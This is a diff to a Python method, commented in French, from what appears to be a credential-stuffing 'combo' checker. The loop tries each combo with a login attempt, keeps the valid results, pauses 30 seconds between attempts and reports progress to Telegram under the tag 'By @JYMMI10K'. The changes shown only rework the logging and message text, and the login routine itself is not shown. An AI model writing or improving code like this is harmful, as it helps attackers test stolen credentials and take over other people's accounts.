@@ -669,49 +669,46 @@ Commandes disponibles :
 
     async def process_combos(self, combos: List[str], receiver: str) -> List[str]:
         """Traite les combos un par un avec un délai de 30 secondes"""
+        print("🔄 Début du traitement des combos")
         valid_results = []
         total = len(combos)
+        print(f"📊 Nombre total de combos à traiter : {total}")
         
         for i, combo in enumerate(combos):
             try:
-                # Message de début pour chaque combo
-                start_message = f"""
-🔍 Début du traitement du combo {i+1}/{total}
-━━━━━━━━━━━━━━━━━━━━
-📊 Combo: {combo}
-⏳ Timeout: 30 secondes
-━━━━━━━━━━━━━━━━━━━━
-💻 By @JYMMI10K
-"""
-                await self.send_telegram_message(start_message)
+                print(f"\n🔍 Traitement du combo {i+1}/{total}")
+                print(f"📝 Combo : {combo}")
                 
-                # Traiter le combo
+                # Message de début
+                start_msg = f"🔍 Début du traitement du combo {i+1}/{total}"
+                print(start_msg)
+                await self.send_telegram_message(start_msg)
+                
+                # Traitement du combo
+                print("⏳ Tentative de connexion...")
                 result = await self.process_combo(combo, receiver)
                 
-                # Ajouter le résultat si valide
+                # Résultat
                 if result:
+                    print(f"✅ Combo valide : {result}")
                     valid_results.append(result)
-                    print(f"✅ Combo valide trouvé : {result}")
+                else:
+                    print("❌ Combo invalide")
                 
-                # Message de résultat pour le combo
-                result_message = f"""
-📊 Résultat du combo {i+1}/{total}
-━━━━━━━━━━━━━━━━━━━━
-✅ Valide: {result is not None}
-📈 Progression totale: {i+1}/{total} ({int(((i+1)/total)*100)}%)
-━━━━━━━━━━━━━━━━━━━━
-💻 By @JYMMI10K
-"""
-                await self.send_telegram_message(result_message)
+                # Message de fin
+                end_msg = f"📊 Résultat du combo {i+1}/{total} : {'Valide' if result else 'Invalide'}"
+                print(end_msg)
+                await self.send_telegram_message(end_msg)
                 
-                # Attendre 30 secondes avant le prochain combo
+                # Attente
                 print("⏳ Attente de 30 secondes...")
                 await asyncio.sleep(30)
                 
             except Exception as e:
-                print(f"❌ Erreur lors du traitement du combo {combo} : {str(e)}")
+                print(f"❌ Erreur sur le combo {combo} : {str(e)}")
                 continue
-            
+        
+        print(f"\n✅ Traitement terminé. {len(valid_results)} combos valides trouvés.")
         return valid_results
 
     async def optimize_performance(self):
